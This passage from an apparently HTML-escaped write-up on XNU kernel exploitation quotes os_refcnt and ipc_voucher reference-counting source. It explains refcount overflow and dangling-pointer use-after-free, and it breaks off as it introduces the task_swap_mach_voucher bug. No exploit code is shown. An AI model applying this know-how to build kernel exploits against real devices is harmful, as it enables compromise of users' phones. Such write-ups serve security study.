    &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_check_overflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_refcnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_count_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__improbable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OS_REFCNT_MAX_COUNT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;os_refcnt: overflow (rc=%p, grp=%s)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ref_grp_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;__builtin_unreachable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The &lt;strong&gt;ipc_voucher_release&lt;/strong&gt; and &lt;strong&gt;ipc_voucher_reference&lt;/strong&gt; functions for a voucher just check whether the voucher is not &lt;strong&gt;NULL&lt;/strong&gt; and call &lt;strong&gt;iv_reference&lt;/strong&gt; and &lt;strong&gt;iv_release&lt;/strong&gt; which then calls &lt;strong&gt;os_ref_retain&lt;/strong&gt; and &lt;strong&gt;os_ref_release&lt;/strong&gt; respectively.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;449&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;450&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher_reference&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;451&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;452&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IPC_VOUCHER_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;453&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;454&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;455&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_reference&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;456&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;457&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;458&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;459&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;460&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;461&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IPC_VOUCHER_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;462&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;iv_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;463&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;105&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;106&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iv_reference&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;107&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;108&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;os_ref_retain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_refs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;109&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;111&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iv_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;113&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;114&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os_ref_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_refs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;115&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;iv_dealloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;116&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;More details can be found under &lt;strong&gt;BUILD/obj/EXPORT_HDRS/libkern/os/refcnt.h&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXPORT_HDRS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libkern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;refcnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    127:  * os_ref_retain: acquire a reference (increment reference count by 1) atomically.
    128:  *
    129:  * os_ref_release: release a reference (decrement reference count) atomically and
    130:  *		return the new count. Memory is synchronized such that the dealloc block
    131:  *		(i.e. code handling the final release() == 0 call) sees up-to-date memory
    132:  *		with respect to all prior release()s on the same refcnt object. This
    133:  *		memory ordering is sufficient for most use cases.
    134:  *
    135:  * os_ref_release_relaxed: same as release() but with weaker relaxed memory ordering.
    136:  *		This can be used when the dealloc block is already synchronized with other
    137:  *		accesses to the object (for example, with a lock).
    138:  *
    139:  * os_ref_release_live: release a reference that is guaranteed not to be the last one.
    140:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;141&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;os_ref_retain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_refcnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;142&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;143&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_count_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_release_explicit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_refcnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;144&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;memory_order&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;release_order&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory_order&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dealloc_order&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OS_WARN_RESULT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;145&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;146&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_count_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OS_WARN_RESULT&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;147&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_refcnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;148&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;149&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_release_explicit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory_order_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory_order_acquire&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;151&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_count_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OS_WARN_RESULT&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;153&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_release_relaxed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_refcnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;154&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;155&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_release_explicit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory_order_relaxed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory_order_relaxed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;156&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;157&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;158&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;159&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_release_live&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_refcnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;160&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__improbable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os_ref_release_explicit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;162&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;memory_order_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory_order_relaxed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;163&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;os_refcnt: unexpected release of final reference (rc=%p)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;164&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;__builtin_unreachable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;165&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;166&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;167&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;There can be two kinds of vulnerabilities that can arise because of this, one is if the reference count can be increased in some way such that it leads to an overflow. We already discussed that because of the maximum cap, this is not really exploitable. However, you can still increase the ref count up to &lt;strong&gt;0x0fffffff&lt;/strong&gt; and we will use this technique later. The other is lets say the object’s reference count can be set to 0 but there is still a pointer to it. Now, since the reference count becomes 0 the object will be freed, and hence the pointer pointing to it becomes what we call a &lt;strong&gt;dangling pointer&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;the-vulnerability&quot;&gt;The Vulnerability&lt;/h3&gt;

&lt;p&gt;So let’s have a look at the vulnerability. Look under the file &lt;strong&gt;/xnu-4903.221.2/osfmk/kern/task.c&lt;/strong&gt; and the function &lt;strong&gt;task_swap_mach_voucher&lt;/strong&gt;. This is a simple function that is supposed to take a new voucher and an old voucher and swap them. Well, this is what it is suppossed to do but it just removes the &lt;strong&gt;old_voucher&lt;/strong&gt; with the &lt;strong&gt;new_voucher&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;5993&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Placeholders for the task set/get voucher interfaces */&lt;/span&gt;
